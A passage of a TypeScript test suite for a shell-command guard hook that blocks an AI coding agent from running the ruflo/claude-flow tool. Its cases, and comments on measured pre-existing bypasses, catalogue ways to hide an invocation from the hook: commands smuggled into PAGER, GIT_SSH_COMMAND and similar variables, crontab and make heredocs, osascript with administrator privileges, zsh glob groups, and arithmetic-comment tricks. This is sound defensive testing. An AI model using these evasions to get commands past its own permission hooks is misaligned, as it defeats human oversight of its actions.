  it("control: psql -c \"select 'program ...'\" allows — round-6 Class 2 fix: PROGRAM is only executable syntax inside an actual COPY/\\copy clause, and this statement has no copy/\\copy keyword at all, so the anchored context regex correctly finds nothing (previously the unanchored regex extracted the string's own contents as shell text and denied — a real over-deny, now fixed)", () => {
    const result = decide(bashCall(`psql -c "select 'program ${R}'"`), {})
    expect(result.action).toBe('allow')
  })

  it("known over-deny, not a regression: psql -c \"select 'copy to program ...'\" denies via H4 even though it only selects a string literal — this guard's anchoring is a keyword scanner, not a SQL-string-literal-aware parser, so it cannot distinguish a genuine COPY...TO...PROGRAM clause from a string literal that merely CONTAINS those words as data on the same statement; measured (not assumed) after implementing the Class 2 fix, and accepted as the guard's existing fail-closed posture rather than built out further", () => {
    const result = decide(bashCall(`psql -c "select 'copy to program ${R}'"`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: psql -c "COPY t TO PROGRAM \'...\'" (double-quoted -c wrapper) still denies via H4 after the Class 2 anchoring change — a genuine COPY clause is unaffected', () => {
    const result = decide(bashCall(`psql -c "COPY t TO PROGRAM '${R}'"`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })
})

describe('decide() — SMI-6869 consumer-string: osascript -e AppleScript source (round-4 cross-family gate)', () => {
  it('osascript -e \'do shell script "..."\' denies via H8-script — measured: the EXISTING quoted-bare-name alternative of INLINE_SCRIPT_BARE_NAME_RE already catches a quoted ruflo mention inside AppleScript source, with no do-shell-script-specific extraction needed', () => {
    const result = decide(bashCall(`osascript -e 'do shell script "${R}"'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8-script')
  })

  it('osascript -e \'do shell script "..." with administrator privileges\' denies via H8-script — the trailing clause does not change which mechanism fires', () => {
    const result = decide(
      bashCall(`osascript -e 'do shell script "${R}" with administrator privileges'`),
      {}
    )
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8-script')
  })

  it("control: osascript -e 'return 1' allows", () => {
    expect(decide(bashCall(`osascript -e 'return 1'`), {}).action).toBe('allow')
  })

  it('control: osascript -e \'display dialog "hi"\' allows — ordinary AppleScript source with no ruflo/claude-flow mention recurses embedded and finds nothing, same as an ordinary awk program', () => {
    expect(decide(bashCall(`osascript -e 'display dialog "hi"'`), {}).action).toBe('allow')
  })
})

describe('decide() — SMI-6869 consumer-string: process-launching env vars (EXEC_ENV_VARS, H8(i) extension)', () => {
  const envVarRows: Array<[string, string]> = [
    ['bare PAGER prefix', `PAGER='${R}' git log`],
    ['env GIT_PAGER (argument to env, not bare prefix)', `env GIT_PAGER='${R}' git log`],
    ['bare EDITOR prefix', `EDITOR='${R}' git commit`],
    ['bare GIT_SSH_COMMAND prefix', `GIT_SSH_COMMAND='${R}' git fetch`],
    ['bare VISUAL prefix (sibling var)', `VISUAL='${R}' git commit`],
    ['bare GIT_EDITOR prefix (sibling var)', `GIT_EDITOR='${R}' git commit`],
    // round 2 (probe-consumers-2.mjs) siblings
    ['GIT_ASKPASS', `GIT_ASKPASS='${R}' git fetch`],
    ['SSH_ASKPASS', `SSH_ASKPASS='${R}' ssh host`],
    ['GIT_EXTERNAL_DIFF', `GIT_EXTERNAL_DIFF='${R}' git diff`],
    ['GIT_SEQUENCE_EDITOR', `GIT_SEQUENCE_EDITOR='${R}' git rebase -i HEAD~2`],
    ['MANPAGER', `MANPAGER='${R}' man ls`],
    ['BROWSER', `BROWSER='${R}' gh repo view -w`],
    ['env -i PAGER (env-argument form survives env its own flags)', `env -i PAGER='${R}' git log`],
  ]
  it.each(envVarRows)('%s denies via H8', (_label, cmd) => {
    const result = decide(bashCall(cmd), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8:')
  })

  it('PAGER assigned an npx form value denies via H5 — round 2 recurses the VALUE through the full pipeline, not just a first-word exact match', () => {
    const result = decide(bashCall(`PAGER='npx ${R}' git log`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H5')
  })

  it('PAGER assigned a sh -c form value denies via H4', () => {
    const result = decide(bashCall(`PAGER='sh -c "${R}"' git log`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('PAGER assigned a ruflo PATH form value denies via H3 (unaffected pre-existing path predicate, now also reachable via the recursion)', () => {
    const result = decide(bashCall(`PAGER='/opt/x/node_modules/.bin/ruflo' git log`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H3')
  })

  it('GIT_SSH_COMMAND assigned a sh -c form value denies via H4', () => {
    const result = decide(bashCall(`GIT_SSH_COMMAND='sh -c "${R}"' git fetch`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: PAGER assigned an ordinary pager name allows', () => {
    expect(decide(bashCall('PAGER=less git log'), {}).action).toBe('allow')
  })

  it('control: GIT_SSH_COMMAND assigned an ordinary ssh invocation with flags allows', () => {
    expect(decide(bashCall(`GIT_SSH_COMMAND='ssh -i ~/.ssh/k' git fetch`), {}).action).toBe('allow')
  })
})

describe('decide() — SMI-6869 consumer-string: heredoc consumers (make/crontab/at/batch)', () => {
  it("make -f - fed a heredoc Makefile recipe denies via H4 — the tab-indented recipe line is its own segment after the guard's \\n-splitting", () => {
    const result = decide(bashCall("make -f - <<'EOF'\nall:\n\t" + R + '\nEOF'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('crontab - fed a heredoc line denies via H4 — round-3 governance strips the 5 leading schedule fields (M2), so argv[0] genuinely is ruflo once they are gone, not just a bare-name match past position 0', () => {
    const result = decide(bashCall("crontab - <<'EOF'\n* * * * * " + R + '\nEOF'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('at now fed a heredoc job body denies via H4', () => {
    const result = decide(bashCall("at now <<'EOF'\n" + R + '\nEOF'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('batch fed a heredoc job body denies via H4 (same treatment as at)', () => {
    const result = decide(bashCall("batch <<'EOF'\n" + R + '\nEOF'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("printf piped into crontab - denies via H4 — round 2's pipe-producer walk-back resolves the LITERAL printf text, then round-3's schedule-field strip (M2) leaves argv[0] genuinely as ruflo", () => {
    const result = decide(bashCall(`printf '* * * * * ${R}\\n' | crontab -`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: make with no heredoc reads its real Makefile from disk — out of reach by design, allows', () => {
    expect(decide(bashCall('make build'), {}).action).toBe('allow')
  })

  it('control: crontab -l (no heredoc) allows', () => {
    expect(decide(bashCall('crontab -l'), {}).action).toBe('allow')
  })

  it('control: crontab -l | crontab - allows — a non-literal producer (crontab itself) yields nothing extracted, never a deny, so ordinary round-tripping usage is unaffected', () => {
    expect(decide(bashCall('crontab -l | crontab -'), {}).action).toBe('allow')
  })

  it('C6: a make recipe line prefixed with @ (silence) still denies via H4 — make itself strips @/-/+ before the shell ever sees the line, so this guard must strip them too', () => {
    const result = decide(bashCall("make -f - <<'EOF'\nall:\n\t@" + R + '\nEOF'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("C7 (regression): make -f - ruflo with a BENIGN heredoc body still denies via H4b — the heredoc body is an ADDITIONAL place to look, not a replacement for the segment's own argv", () => {
    const result = decide(
      bashCall(`make -f - ${R.split(' ')[0]} <<'EOF'\nall:\n\techo hi\nEOF`),
      {}
    )
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4b')
  })

  it('C7 (regression): crontab - ruflo with a BENIGN heredoc body still denies via H4b', () => {
    const result = decide(bashCall(`crontab - ${R.split(' ')[0]} <<'EOF'\n* * * * * date\nEOF`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4b')
  })

  it('C7 (regression): make -f - -I node_modules/ruflo/bin with a benign heredoc body still denies via H1 — the path-shaped flag value in argv is its own H1 match, independent of the heredoc', () => {
    const result = decide(
      bashCall("make -f - -I node_modules/ruflo/bin <<'EOF'\nall:\n\techo hi\nEOF"),
      {}
    )
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H1')
  })

  it('C7 (regression): crontab - node_modules/.bin/ruflo with a benign heredoc body still denies via H3', () => {
    const result = decide(
      bashCall("crontab - node_modules/.bin/ruflo <<'EOF'\n* * * * * date\nEOF"),
      {}
    )
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H3')
  })

  it('M2: an ordinary crontab install (5 schedule fields + a real command, no ruflo) allows — the schedule fields no longer reach the all-digit arm', () => {
    expect(
      decide(bashCall("crontab - <<'EOF'\n0 3 * * * /usr/local/bin/backup.sh\nEOF"), {}).action
    ).toBe('allow')
  })

  it('M3: an ordinary make -f - recipe using $(CC)/$@/$< allows — a make-level variable reference at the head is skipped, not denied, since make (not the shell) resolves it to a name this guard cannot see either way', () => {
    expect(
      decide(bashCall("make -f - <<'EOF'\napp: main.o\n\t$(CC) -o $@ $<\nEOF"), {}).action
    ).toBe('allow')
  })

  it('m5 (control): a SPACE-indented (not tab) Makefile recipe line still denies — this guard strips the prefix on every line rather than only tab-indented ones (GNU make lets .RECIPEPREFIX change the character), so over-scanning here costs at worst an over-deny on a Makefile make itself would reject as "missing separator"', () => {
    const result = decide(bashCall("make -f - <<'EOF'\nall:\n    " + R + '\nEOF'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })
})

// Governance round 8 Major fix (pre-existing, closed here since the patch is
// verified): H7's own two path patterns (`H7_RE1`/`H7_RE2`) bracket only a
// GLOBAL npm install's `lib/node_modules/ruflo` layout and nvm's own
// `versions/node/vX/bin/...` layout -- neither one matches the generic
// `<any-prefix>/bin/<name>` symlink shape a global npm install ALSO creates
// through every other common prefix (`/usr/local/bin`, `/opt/homebrew/bin`,
// `~/bin`, ...), so those all allowed on both trees before this fix. This
// is its own dedicated describe block, not folded into the C1 block above,
// because it is a genuinely NEW security predicate arm (`H7_RE3`) rather
// than a bugfix to existing coverage.
describe('decide() — SMI-6869 governance round 8 H7: bin/ruflo path tail through a non-nvm global-install prefix (new coverage)', () => {
  const redArms: Array<[string, string]> = [
    ['/usr/local/bin/ruflo status', '/usr/local/bin/ruflo status'],
    ['/opt/homebrew/bin/ruflo memory store', '/opt/homebrew/bin/ruflo memory store'],
    ['~/bin/ruflo status', '~/bin/ruflo status'],
    ['/usr/local/bin/claude-flow status', '/usr/local/bin/claude-flow status'],
    ['bash /usr/local/bin/ruflo', 'bash /usr/local/bin/ruflo'],
  ]
  it.each(redArms)('%s denies via H7', (_label, cmd) => {
    const result = decide(bashCall(cmd), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H7:')
  })

  it('control: /usr/local/bin/rufloctl x allows — H7_RE3 is anchored at end-of-token so a bin/ruflo-something basename is untouched', () => {
    expect(decide(bashCall('/usr/local/bin/rufloctl x'), {}).action).toBe('allow')
  })

  it('control: /Users/x/.nvm/versions/node/v22.22.2/bin/ruflo memory store --key k --value v still denies via H7 — the pre-existing H7_RE2 nvm-path arm is unaffected by adding H7_RE3', () => {
    const result = decide(
      bashCall('/Users/x/.nvm/versions/node/v22.22.2/bin/ruflo memory store --key k --value v'),
      {}
    )
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H7:')
  })
})

// Governance round 8 follow-up (same dispatch as the H7_RE3 block above,
// applied after that block's own `./ruflo` gap test was measured and
// reported): this coordinator-measured, real, PRE-EXISTING bypass — on
// `main` at `50d38872d`, `./ruflo memory store`, `../ruflo memory store` and
// `bash ./ruflo` all allow — is the same path-spelling family as H7_RE1-3,
// so it closes here as H7_RE4 rather than waiting for a separate commit.
// Deliberately narrow: anchored on a LEADING `./`/`../` (not a blunt
// basename match) because the reviewer measured that a broader draft
// regresses the H7_RE2 nvm-path label and false-positives a slash-bearing
// non-path token. Its own describe block, matching the H7_RE3 block's own
// "genuinely new security predicate arm" rationale above.
describe('decide() — SMI-6869 governance round 8 H7_RE4: explicit relative execution path (./ruflo, ../ruflo) (new coverage)', () => {
  const redArms: Array<[string, string]> = [
    ['./ruflo memory store', './ruflo memory store'],
    ['../ruflo memory store', '../ruflo memory store'],
    ['./tools/ruflo status', './tools/ruflo status'],
    ['bash ./ruflo', 'bash ./ruflo'],
    ['./claude-flow status', './claude-flow status'],
  ]
  it.each(redArms)('%s denies via H7', (_label, cmd) => {
    const result = decide(bashCall(cmd), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H7:')
  })

  it('control: ./rufloctl x allows — anchored at end-of-token, same as H7_RE3, so a bin/ruflo-something-shaped relative path is untouched', () => {
    expect(decide(bashCall('./rufloctl x'), {}).action).toBe('allow')
  })

  it('control: ./scripts/ruflo-service-up.sh allows — the basename is not the name', () => {
    expect(decide(bashCall('./scripts/ruflo-service-up.sh'), {}).action).toBe('allow')
  })

  it('control: cat ./ruflo.txt allows — a trailing extension is not the exact name', () => {
    expect(decide(bashCall('cat ./ruflo.txt'), {}).action).toBe('allow')
  })

  it('control: ./node_modules/.bin/ruflo still denies via H3, label unchanged — H3 is checked before H7 in checkH1toH7, so this shape reaches H3 first regardless of H7_RE4', () => {
    const result = decide(bashCall('./node_modules/.bin/ruflo'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H3:')
  })

  it('control: the nvm-path row still denies via H7 — H7_RE4 is additive, not a replacement for H7_RE2', () => {
    const result = decide(
      bashCall('/Users/x/.nvm/versions/node/v22.22.2/bin/ruflo memory store --key k --value v'),
      {}
    )
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H7:')
  })

  it('control: /usr/local/bin/ruflo still denies via H7 — H7_RE4 is additive, not a replacement for H7_RE3', () => {
    const result = decide(bashCall('/usr/local/bin/ruflo'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H7:')
  })
})

// RE3 has no prefix restriction, so RE2's only distinct match is the
// `cli` basename under nvm; this pins it.
describe('decide() — SMI-6869 governance round 10 L2: H7_RE2 is redundant with H7_RE3 for the three real names — its one surviving unique arm is the bare "cli" basename under an nvm path', () => {
  it('the nvm cli-basename row still denies via H7 — H7_RE2\'s own surviving unique coverage, not subsumed by H7_RE3 (which has no "cli" alternative)', () => {
    const result = decide(
      bashCall('/Users/x/.nvm/versions/node/v22.22.2/bin/cli memory store --key k --value v'),
      {}
    )
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H7:')
  })
})

// --- Runtime input failures (round 1 finding 4) ---

describe('decide() — malformed/unparseable input denies, unrelated tools allow', () => {
  it('non-object payload denies', () => {
    expect(decide('not-an-object' as never, {}).action).toBe('deny')
  })

  it('null payload denies', () => {
    expect(decide(null, {}).action).toBe('deny')
  })

  it('non-string tool_name denies', () => {
    expect(decide({ tool_name: 1 } as never, {}).action).toBe('deny')
  })

  it('Bash with missing tool_input denies', () => {
    expect(decide({ tool_name: 'Bash' }, {}).action).toBe('deny')
  })

  it('Bash with non-string command denies', () => {
    expect(decide({ tool_name: 'Bash', tool_input: { command: 42 } }, {}).action).toBe('deny')
  })

  it('an unrelated well-formed tool call allows', () => {
    expect(decide({ tool_name: 'Read', tool_input: { file_path: '/tmp/x' } }, {}).action).toBe(
      'allow'
    )
  })

  it('empty Bash command allows (nothing to evaluate)', () => {
    expect(decide(bashCall(''), {}).action).toBe('allow')
  })
})

// --- Runtime wrapper exercised as a child process ---

function runGuardChildProcess(stdin: string) {
  return spawnSync(process.execPath, [GUARD_SCRIPT_PATH], {
    input: stdin,
    encoding: 'utf8',
  })
}

describe('runtime wrapper (child process) — malformed input shapes deny', () => {
  it('empty stdin -> deny JSON on stdout, exit 0', () => {
    const result = runGuardChildProcess('')
    expect(result.status).toBe(0)
    const parsed = JSON.parse(result.stdout)
    expect(parsed.hookSpecificOutput.permissionDecision).toBe('deny')
  })

  it('invalid JSON ("{") -> deny JSON on stdout, exit 0', () => {
    const result = runGuardChildProcess('{')
    expect(result.status).toBe(0)
    const parsed = JSON.parse(result.stdout)
    expect(parsed.hookSpecificOutput.permissionDecision).toBe('deny')
  })

  it('{"tool_name":1} -> deny JSON on stdout, exit 0', () => {
    const result = runGuardChildProcess('{"tool_name":1}')
    expect(result.status).toBe(0)
    const parsed = JSON.parse(result.stdout)
    expect(parsed.hookSpecificOutput.permissionDecision).toBe('deny')
  })

  it('a matched tool (Bash) without tool_input -> deny JSON on stdout, exit 0', () => {
    const result = runGuardChildProcess(JSON.stringify({ tool_name: 'Bash' }))
    expect(result.status).toBe(0)
    const parsed = JSON.parse(result.stdout)
    expect(parsed.hookSpecificOutput.permissionDecision).toBe('deny')
  })

  it('a well-formed unrelated tool call -> allow (no stdout, exit 0)', () => {
    const result = runGuardChildProcess(
      JSON.stringify({ tool_name: 'Read', tool_input: { file_path: '/tmp/x' } })
    )
    expect(result.status).toBe(0)
    expect(result.stdout.trim()).toBe('')
  })

  it('M-D: a real ruflo invocation -> deny JSON with an H-labelled reason, not just malformed-input denials', () => {
    const result = runGuardChildProcess(
      JSON.stringify(bashCall('npx ruflo memory store --key k --value v'))
    )
    expect(result.status).toBe(0)
    const parsed = JSON.parse(result.stdout)
    expect(parsed.hookSpecificOutput.permissionDecision).toBe('deny')
    expect(parsed.hookSpecificOutput.permissionDecisionReason).toMatch(/\[ruflo-host-guard\] H\d/)
  })
})

// SMI-6903 C2 (Critical, pre-existing, BOTH guards): a `#` inside an
// arithmetic command `((…))` is not a comment, so the rest of the line is
// live. Measured in bash 3.2, bash 5.2 and zsh 5.9 -- all three run the tail.
// Before the fix the tokenizer discarded it, so a ruflo invocation hidden
// this way reached allow.
describe('decide() — SMI-6903 C2: an arithmetic ((…)) cannot hide an invocation', () => {
  // The ONE arm on this guard that constrains the arithmetic fix, and the
  // reason is asserted, not just the action: on the pre-fix tree this ALLOWS,
  // and here it must deny via H5 -- the invocation itself -- rather than via
  // the pre-existing paren path below.
  it('(( #2 )); npx ruflo memory store -> deny H5 (the tail after the `#` is live)', () => {
    const result = decide(bashCall('(( #2 )); npx ruflo memory store'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toMatch(/\[ruflo-host-guard\] H5/)
  })

  // These two are verdict PINS, not coverage, and the difference matters.
  // Measured: `(( 1 #2 )); npx ruflo memory store` denies `unresolved-command`
  // on the pre-fix tree AND here, because `1` is left as a segment head this
  // guard cannot resolve -- a pre-existing over-block that masks the
  // arithmetic rule entirely. They would pass unchanged with the fix removed,
  // so they prove nothing about it; the constraining coverage for this guard
  // is the H5 row above, plus the tokenizer rows in
  // shell-command-normalize.test.ts that assert the tail survives
  // tokenization. Kept so a future change to that over-block is visible here
  // rather than silent, and labelled so nobody reads them as the rule's test.
  const pinsThatPassWithoutTheFix = [
    '(( 1 #2 )); npx ruflo memory store',
    'true && (( 1 #2 )); npx ruflo memory store',
  ]
  it.each(pinsThatPassWithoutTheFix)(
    'pin (does NOT constrain the fix; pre-existing unresolved-command): %s -> deny',
    (command) => {
      expect(decide(bashCall(command), {}).action).toBe('deny')
    }
  )

  // Asserted as a PROPERTY, because a pinned verdict here would measure the
  // wrong thing. This guard already denies `( ( 1 ) ); echo ok` -- any
  // paren-segmented line whose head it cannot resolve -- on both the pre-fix
  // and post-fix trees (measured), a pre-existing over-block unrelated to the
  // comment rule. So the question that isolates THIS rule is whether adding
  // the `#` changes anything: with a blank between the parens it must not,
  // because all three shells read a comment there and the arithmetic
  // suppression deliberately does not fire.
  it('control: a blank between the parens leaves the verdict unchanged by the `#`', () => {
    expect(decide(bashCall('( ( 1 #2 ) ); npx ruflo memory store'), {}).action).toBe(
      decide(bashCall('( ( 1 ) ); npx ruflo memory store'), {}).action
    )
  })

  // Why `(( #2 ))` is this guard's only constraining arm for the rule, and
  // why no single-tree row can do better: a `#` opening the expression leaves
  // nothing before it, so the pre-existing unresolved-head over-block cannot
  // fire and the verdict turns entirely on whether the tail survived
  // tokenization -- which is what the H5 REASON assertion above pins. For
  // every `(( 1 #2 ))` shape, and for a no-`#` twin like `(( 2 ))`, that
  // over-block denies on both trees (measured), so an in-test comparison
  // between them is uninformative by construction. The cross-tree evidence
  // lives in the arms table on SMI-6903, not here.
})

// SMI-6903 H1 (High, pre-existing): a zsh glob group welded into a PATH hid a
// ruflo binary from the argv[0]-keyed H3/H5 checks, because splitting on `(`,
// `|` and `)` left an alternative as the segment's argv[0] and the real path
// as a mere argument. Measured in zsh 5.9 with a decoy executable actually
// invoked: `./(node_modules|x)/.bin/tool`, `./(x|node_modules)/.bin/tool`,
// `./node_modules/.bin/(tool|x)` and `./(a|node_modules)/(x|.bin)/tool` all
// RUN it; both bashes reject the syntax. Fixed with an ADDITIVE second
// reading (`evaluateGlobGroupReadings`) -- teaching `splitSegments` itself
// about word-position parens was tried and rejected on measurement, because
// it moved 21 real repository command lines from deny to allow.
describe('decide() — SMI-6903 H1: a zsh glob group cannot hide a ruflo path', () => {
  // The three arms that CONSTRAIN the fix: each ALLOWED on the pre-fix tree
  // (measured) because the split left a glob alternative as argv[0].
  const redArms = [
    './(node_modules|x)/.bin/ruflo memory store',
    './(x|node_modules)/.bin/ruflo memory store',
    './(a|node_modules)/(x|.bin)/ruflo memory store',
  ]
  it.each(redArms)('%s -> deny (one zsh word; argv[0] is the real path)', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('deny')
  })

  // Pins, not coverage: these two already DENIED before the fix, via H4 on the
  // bare `ruflo` word inside the group rather than via argv[0] (measured on
  // the pre-fix tree). They would pass with the fix removed, so they prove
  // nothing about it -- kept so a change to H4's own reach is visible here,
  // and labelled so they are not mistaken for the rule's test.
  const pinsThatPassWithoutTheFix = [
    './node_modules/.bin/(ruflo|x) memory store',
    'node_modules/.bin/(ruflo|x) memory store',
  ]
  it.each(pinsThatPassWithoutTheFix)(
    'pin (does NOT constrain the fix; already denied via H4): %s -> deny',
    (command) => {
      expect(decide(bashCall(command), {}).action).toBe('deny')
    }
  )

  const allowControls = [
    // A non-ruflo binary reached the same way must stay allowed.
    './(node_modules|x)/.bin/less',
    './(node_modules|x)/.bin/tsc --noEmit',
    // An ordinary glob group in an argument, and two of them.
    'echo (a|b)',
    'echo (a|b) (c|d)',
    'ls (src|dist)/index.js',
    'git log (a|b)',
    // A leading `(` is COMMAND position, not a glob: measured in zsh 5.9,
    // `(./node_modules|x)/.bin/tool` is a PARSE ERROR, so nothing runs. This
    // row corrects an expectation the author first got wrong by reasoning.
    '(./node_modules|x)/.bin/ruflo memory store',
  ]
  it.each(allowControls)('control: %s -> allow', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  it('control: the additive reading does not disturb a real subshell', () => {
    expect(decide(bashCall('(npx ruflo memory store)'), {}).action).toBe('deny')
    expect(decide(bashCall('(echo x) | cat'), {}).action).toBe('allow')
  })

  it('control: a C-style arithmetic for-loop is untouched', () => {
    expect(decide(bashCall('for (( i=0; i<3; i++ )); do :; done'), {}).action).toBe('allow')
  })

  it('control: an array append keeps its own verdict (multi-word alternative)', () => {
    // No glob alternative can hold two words, so a group that does is an
    // array assignment and is never expanded. The repository's own
    // `compose_profile_args+=(--profile "$profile")` was the single corpus
    // difference this rule removed.
    expect(decide(bashCall('compose_profile_args+=(--profile "$profile")'), {}).action).toBe(
      'allow'
    )
  })

  it('a five-group path is READ now that only the cross product is capped (round 22)', () => {
    // Five two-way groups is 32 readings; round 21's group cap of four
    // abandoned this and the verdict fell back to the primary reading, which
    // ALLOWED it (the cross-family gate measured zsh 5.9 running a real
    // five-group path). The group cap is gone; see the round 22 block below.
    expect(decide(bashCall('./(a|b)/(c|d)/(e|f)/(g|h)/(i|j)/ruflo memory store'), {}).action).toBe(
      'deny'
    )
  })
})

// SMI-6903 round 23 (the cross-family re-gate): the launcher table's value
// flags are each row's FULL synopsis now, and `flock FILE -c COMMAND` joined
// the shared `DASH_C_LAUNCHERS` set this guard recurses (measured running its
// body in bash 5.2). Two consequences for this guard, each measured on
// `e5396e581` and here: a `-c` body behind `flock` reaches H4 where it was
// allowed, and a separated long-form value that used to sit as an all-digit
// `argv[0]` (`ionice --class 3 …`, `xargs --max-args 1 …`) is consumed, so the
// fail-closed `unresolved-command` fallback no longer fires on a benign
// command and H4 fires on a ruflo one.
describe("decide() — SMI-6903 round 23: a launcher's full option model, and flock -c", () => {
  it("flock /tmp/l -c 'ruflo memory store --key k' -> deny (H4, the body is recursed)", () => {
    const result = decide(bashCall("flock /tmp/l -c 'ruflo memory store --key k'"), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('xargs --max-args 1 ruflo memory store -> deny (H4, not the all-digit fallback)', () => {
    const result = decide(bashCall('xargs --max-args 1 ruflo memory store'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  // Corrected over-blocks: a benign command whose launcher value was read as
  // an all-digit command name denied `unresolved-command` before; the value
  // is consumed now and nothing ruflo-shaped remains.
  const correctedAllows = [
    'ionice --class 3 cat notes.txt',
    'script -q -t 1 /dev/null cat notes.txt',
    'stdbuf --output L cat notes.txt',
  ]
  it.each(correctedAllows)('%s -> allow (value consumed, nothing ruflo-shaped left)', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  // PIN: an optional-argument flag is never a value flag, so the bare name
  // after `--replace` is still the command (H4 on every tree).
  it('pin: xargs --replace ruflo memory store -> deny (H4)', () => {
    expect(reasonOf(decide(bashCall('xargs --replace ruflo memory store'), {}))).toContain('H4:')
  })
})

// SMI-6903 round 22, a correction the shared launcher table forced: `command
// -v NAME` DESCRIBES a name and runs nothing (measured in bash 3.2 and zsh 5.9
// with a decoy executable named through a variable: no marker written, while
// the bare invocation control wrote it). With `flock` in the table, peeling
// through `command -v flock` left an EMPTY command and the fail-closed arity
// fallback denied a real repository line; `command` now carries stop flags
// (`-v`, `-V`; `--help`/`--version` for every launcher) under which no peel
// happens. Two corpus lines move from `unresolved-command` to allow as a
// result (`command -v "$x" >/dev/null 2>&1 || …`): a computed name that is
// never executed was an over-block, not a catch.
describe('decide() — SMI-6903 round 22: `command -v NAME` is not an invocation of NAME', () => {
  const allowNow = [
    'command -v flock',
    'if command -v flock >/dev/null 2>&1; then echo yes; fi',
    'command -v "$x" >/dev/null 2>&1 || { echo absent; exit 0; }',
    'command -v "$1" >/dev/null 2>&1 || err "required command not found"',
  ]
  it.each(allowNow)('%s -> allow (describes, never runs)', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  // A ruflo NAME under `command -v` still denies: the bare-name inversion
  // (H4b) sees it where the launcher peel no longer hands it to H4, and an
  // assignment feeding it is H8's. The verdict is unchanged; the predicate is.
  const stillDeny: Array<[string, string]> = [
    ['command -v ruflo', 'H4b'],
    ['command -V ruflo', 'H4b'],
    ['x=ruflo; command -v "$x"', 'H8'],
  ]
  it.each(stillDeny)('%s -> deny (%s)', (command, predicate) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain(predicate)
  })

  // PIN, the arity fallback this guard already had for a modelled launcher
  // with nothing after its own operands (`timeout 5` alone denies the same
  // way on every tree): `flock FILE` with no command now shares it.
  it('pin: flock 9 -> deny (unresolved-command, the modelled-launcher arity fallback)', () => {
    const result = decide(bashCall('flock 9'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('unresolved-command')
    expect(reasonOf(decide(bashCall('timeout 5'), {}))).toContain('unresolved-command')
  })
})

// SMI-6903 round 22 F2 (High, found by the cross-family gate): past either
// expansion cap, `globGroupAlternativeReadings` returned `[]`, which reads
// exactly like "nothing to expand", so the ruflo guard fell back to its primary
// reading and ALLOWED a five-group path that zsh 5.9 invokes (measured by the
// gate with a real executable: `/(u|x)(sr|y)/(b|x)(in|y)/(env|x) printf`
// runs). Coverage dropped precisely at the cap, the opposite of ADR-172
// sec 4's posture. Two changes: the cap on the NUMBER of groups is gone (a
// one-alternative group is one reading, and a blanket deny at five groups hit
// a pinned `node -e` script and a real repository SQL line, measured), and
// past the one remaining cap, the cross product, the expansion returns null
// and the guard denies `glob-cap`: a command it cannot read is a command it
// does not allow. The cost is a stated over-block on an alternation wider than
// 64 readings that names no ruflo path, pinned below as the posture's price.
describe('decide() — SMI-6903 round 22 F2: past the glob cap the ruflo guard fails closed', () => {
  // Each ALLOWED on 827a0b910 (abandoned by the group cap, verdict fell back).
  const readNowArms = [
    // Five groups, 32 readings: expanded and denied through the real path.
    './(a|b)/(c|d)/(e|f)/(g|h)/(i|j)/ruflo memory store',
    // Five one-alternative groups: one reading, read to the end.
    './(a)/(b)/(c)/(d)/(e)/ruflo memory store',
  ]
  it.each(readNowArms)('%s -> deny (read, no longer abandoned)', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('deny')
  })

  const capArms = [
    // Seven two-way groups: 128 readings, past the cap.
    './(a|b)/(c|d)/(e|f)/(g|h)/(i|j)/(k|l)/(m|n)/ruflo memory store',
    // Four groups of four: 256 readings, past the cap.
    './(a|b|c|d)/(e|f|g|h)/(i|j|k|l)/(m|n|o|p)/ruflo memory store',
  ]
  it.each(capArms)('%s -> deny glob-cap', (command) => {
    const verdict = decide(bashCall(command), {})
    expect(verdict.action).toBe('deny')
    expect(verdict.json.hookSpecificOutput.permissionDecisionReason).toContain('glob-cap')
  })

  // The boundary and the shapes the group cap used to over-block.
  const allowControls = [
    // Six two-way groups: 64 readings, AT the cap, expanded, no ruflo path.
    './(a|b)/(c|d)/(e|f)/(g|h)/(i|j)/(k|l)/less',
